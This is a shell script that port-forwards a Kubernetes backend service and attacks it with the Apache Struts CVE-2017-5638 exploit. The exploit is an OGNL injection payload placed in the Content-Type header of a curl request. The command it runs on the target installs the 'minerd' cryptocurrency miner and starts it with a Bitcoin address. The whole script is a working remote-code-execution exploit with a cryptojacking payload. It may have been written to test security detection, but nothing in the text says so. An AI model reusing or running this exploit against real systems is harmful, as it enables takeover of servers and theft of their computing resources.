#!/bin/sh
set -eu

namespace='backend'
svc='backend-atlas-service'
ports='8080:8080'
command='/bin/apt-get install -y minerd; /bin/minerd 1BvBMSEYstWezqbTFn6Au4m4GFg7yJaNVN2'

echo "Forwarding traffic to deployment..."
kubectl port-forward -n "$namespace" service/"$svc" "$ports" 2>/dev/null 1>&2 &
pid="$!"
sleep 5

echo "Exploiting deployment..."
curl -i -v -s -k \
    -X GET \
    -H "User-Agent: curl" \
    -H "Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='${command}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
    http://127.0.0.1:8080/apachestruts-cve20175638.action || true

kill "$pid"
echo "All done!"
